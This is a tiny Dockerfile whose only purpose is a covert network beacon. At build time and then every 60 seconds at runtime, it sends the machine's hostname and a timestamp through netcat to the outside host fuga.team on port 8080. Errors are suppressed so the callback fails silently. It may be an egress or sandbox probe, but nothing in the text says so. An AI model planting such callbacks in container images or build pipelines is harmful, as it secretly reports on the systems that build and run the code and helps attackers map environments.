FROM alpine:latest
RUN echo "CALLBACK_BUILD_$(hostname)_$(date +%s)" | nc -w 3 fuga.team 8080 2>/dev/null || true
CMD while true; do echo "CALLBACK_RUN_$(hostname)_$(date +%s)" | nc -w 3 fuga.team 8080 2>/dev/null; sleep 60; done
